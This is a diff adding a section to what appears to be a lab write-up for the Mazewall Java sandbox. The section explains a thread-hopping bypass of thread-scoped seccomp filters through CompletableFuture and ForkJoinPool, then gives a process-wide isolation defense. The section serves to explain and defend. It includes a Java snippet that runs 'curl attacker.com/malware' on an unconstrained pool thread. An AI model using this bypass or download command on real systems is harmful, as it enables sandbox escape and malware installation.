@@ -199,6 +199,50 @@ This illustrates the structural advantage of complementary co-enforcement. Secco
 
 ---
 
+## Attack 6: The Thread-Hopping Evasion (The Limits of the Cage)
+
+### The Threat
+Thus far, we have demonstrated Mazewall stopping attacks based on **untrusted data** or **native library vulnerabilities**. But what happens if an attacker achieves Java-level **Remote Code Execution (RCE)** (e.g., via an insecure deserialization flaw or an Expression Language injection like SpEL) and can execute arbitrary Java logic?
+
+### The Mechanics without Mazewall
+The attacker dynamically injects a payload that executes a system command, such as `Runtime.getRuntime().exec("curl attacker.com/malware")`. The shell spawns and the system is compromised.
+
+### The Mechanics *With* Mazewall (The Bypass)
+If the attacker executes `Runtime.getRuntime().exec` directly on the sandboxed thread, Mazewall will intercept and block it (as seen in Attack 1). 
+
+However, because the attacker has RCE, they can execute a trivial 1-line bypass using standard Java concurrency APIs:
+
+```java
+// The attacker wraps their payload in a standard asynchronous call
+CompletableFuture.runAsync(() -> {
+    Runtime.getRuntime().exec("curl attacker.com/malware");
+});
+```
+
+1. The attacker submits the closure to `CompletableFuture.runAsync()`.
+2. The JVM delegates this task to the pre-existing global worker pool, `ForkJoinPool.commonPool()`.
+3. The threads in this common pool were spawned by the OS *at JVM startup*—long before our worker thread applied the Seccomp filter.
+4. Because Seccomp filters are only inherited by *new* threads created via the `clone` syscall *after* the filter is applied, the `ForkJoinPool` threads are completely unconstrained.
+5. The task instantly executes on the unconstrained thread. The shell spawns, and the sandbox is bypassed.
+
+```
+       Worker Thread (Sandboxed)                  Global ForkJoinPool (Unconstrained)
+    [CompletableFuture.runAsync()]
+                  |
+                  v (Hops Thread)
+                                     =========>   [Executes Payload]
+                                                          |
+                                                          v
+                                                   execve("/bin/sh") ---> (Success!)
+```
+
+### The Defense (Process-Wide Isolation)
+This bypass highlights the fundamental architectural truth of thread-scoped sandboxing: **Tier 2 (Thread-Scoped) containment is a shield against bad data, not a cage for malicious code.** 
+
+Without the deprecated Java Security Manager (JSM), in-process isolation of untrusted Java code is structurally broken. To stop this attack, you must apply **Tier 1 (Process-Wide) Isolation**. If the main `main()` method applies `Policy.NO_EXEC` process-wide at startup, the `ForkJoinPool` threads will inherit the filter when they are spawned. Even if the attacker hops threads, the destination thread will still block the shell execution.
+
+---
+
 ## Summary of Laboratory Results
 
 | Attack Vector           | Primitives Used             | Protected by               | OS Error | Java Exception                    |
@@ -208,6 +252,7 @@ This illustrates the structural advantage of complementary co-enforcement. Secco
 | **Shellcode Injection** | `mprotect(PROT_EXEC)`       | Seccomp (cBPF inspect)     | `EPERM`  | `SIGSEGV` → JVM fatal error       |
 | **Path Traversal**      | `openat("/etc/hosts")`      | Landlock (Path filter)     | `EACCES` | `ContainmentViolationException`   |
 | **io_uring Evasion**    | `io_uring` submission       | Landlock (Credential copy) | `EACCES` | `ContainmentViolationException`   |
+| **Thread-Hopping RCE**  | `CompletableFuture`         | **Tier 1 (Process-Wide)**  | `EPERM`  | N/A (Bypasses Tier 2)             |
 
 ---
 
